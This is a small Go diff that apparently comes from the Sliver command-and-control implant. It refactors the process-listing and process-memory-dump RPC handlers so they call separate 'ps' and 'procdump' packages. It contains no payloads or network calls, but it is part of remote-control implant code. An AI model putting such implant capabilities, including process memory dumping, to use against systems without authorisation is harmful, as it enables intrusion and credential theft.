@@ -15,6 +15,8 @@ import (
 	"os"
 	"path/filepath"
 	pb "sliver/protobuf/sliver"
+	"sliver/sliver/procdump"
+	"sliver/sliver/ps"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -55,7 +57,7 @@ func psHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	procs, err := Processes()
+	procs, err := ps.Processes()
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("failed to list procs %v", err)
@@ -298,7 +300,7 @@ func dumpHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	res, err := DumpProcess(procDumpReq.Pid)
+	res, err := procdump.DumpProcess(procDumpReq.Pid)
 	dumpResp := &pb.ProcessDump{Data: res.Data()}
 	if err == nil {
 		dumpResp.Err = ""
